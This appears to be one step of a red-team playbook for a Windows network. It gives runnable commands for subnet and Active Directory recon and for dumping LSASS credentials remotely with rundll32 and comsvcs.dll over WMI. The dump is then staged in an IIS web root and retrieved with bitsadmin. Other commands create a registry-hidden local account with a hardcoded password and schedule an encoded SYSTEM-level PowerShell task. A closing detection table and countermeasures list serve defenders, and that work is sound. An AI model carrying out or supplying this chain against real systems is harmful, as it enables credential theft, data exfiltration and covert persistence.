# Step 4: Credential Access and Recon (WMI + SSH + comsvcs.dll)

## Objective
- Access sensitive credentials for lateral movement  
- Discover internal hosts and Active Directory structure  
- Establish backup persistence through WMI tasks or stealth accounts

## Context
- Initial access through a web shell (e.g., `/admin/update.aspx`) on DMZ web server  
- Pivot into ENG subnet using valid credentials over WMI or SSH  
- `ENG-NET\engineer` or `itAdmin` credentials are assumed available  
- `comsvcs.dll` is used via `rundll32.exe` to dump LSASS memory using only built-in Windows utilities

## Execution

### 1. Network Recon
```cmd
route print
arp -a
Test-Connection -Count 1 -ComputerName 10.2.15.1..254
```

### 2. AD Recon (Targeted via SSH tunnel or dropper)
```powershell
Get-ADComputer -SearchBase "OU=Engineering,DC=corp,DC=domain,DC=local"
Get-NetGroupMember -Group "Domain Admins"
```

### 3. Identify LSASS PID
```powershell
Invoke-WmiMethod -ComputerName ENGWS01 -Class Win32_Process -Name Create -Credential $cred -ArgumentList 'tasklist > C:\Windows\Temp\tasks.txt'
```
Parse the file to find the PID of `lsass.exe`.

### 4. Dump LSASS with comsvcs.dll (via WMI)
```powershell
Invoke-WmiMethod -ComputerName ENGWS01 -Class Win32_Process -Name Create -Credential $cred -ArgumentList 'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\ls.dmp full'
```

### 5. Compress and Exfiltrate Dump
```cmd
makecab.exe C:\Windows\Temp\ls.dmp C:\Windows\Temp\archive.cab
move C:\Windows\Temp\archive.cab C:\inetpub\wwwroot\update.cab
```

From attacker machine (via web shell or tunnel):
```cmd
bitsadmin /transfer job /download http://dmz-web/update.cab C:\Users\Public\ls.cab
```

### 6. Create Backup Local Account (Stealth)
```powershell
$Password = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
New-LocalUser "svc_diag" -Password $Password -Description "Service Recovery Agent"
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "svc_diag"
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v svc_diag /t REG_DWORD /d 0 /f
```

### 7. Schedule Persistence Task (via WMI)
```cmd
schtasks /Create /S ENGWS01 /RU SYSTEM /SC ONCE /TN "Updater" /TR "powershell -enc <payload>" /ST 01:00
```

## Result
- `svc_diag` user is created and hidden as a backup login  
- LSASS memory is dumped using Microsoft-signed binaries (OPSEC-safe)  
- Engineering subnet layout and key assets identified  
- Credentials harvested and persistence established via scheduled task

## Detection Opportunities

| Vector                     | Description                                                   |
|----------------------------|---------------------------------------------------------------|
| WMI Remote Execution       | CreateProcess calls to `rundll32`, `schtasks`, etc.           |
| LSASS Dump via comsvcs.dll | `rundll32.exe` with `MiniDump` function targeting `lsass.exe` |
| Scheduled Task Creation    | SYSTEM-level task creation on remote host                    |
| Hidden local user          | Registry key added under `UserList`                          |
| File movement              | Dump copied, compressed, and staged via IIS/web path         |

## Defensive Countermeasures

- Enable **LSASS Protected Process Light (PPL)** to block dumping memory via `comsvcs.dll`  
- Monitor **WMI-based execution** across subnet boundaries  
- Detect **rundll32.exe calls** using `MiniDump` from `comsvcs.dll`  
- Watch for **`makecab.exe`** activity on sensitive process dumps  
- Audit **registry writes** under `Winlogon\SpecialAccounts\UserList`  
- Use **network segmentation and firewall rules** to restrict WMI/SMB access  
- Alert on **IIS hosting dump files** or abnormal outbound traffic from DMZ
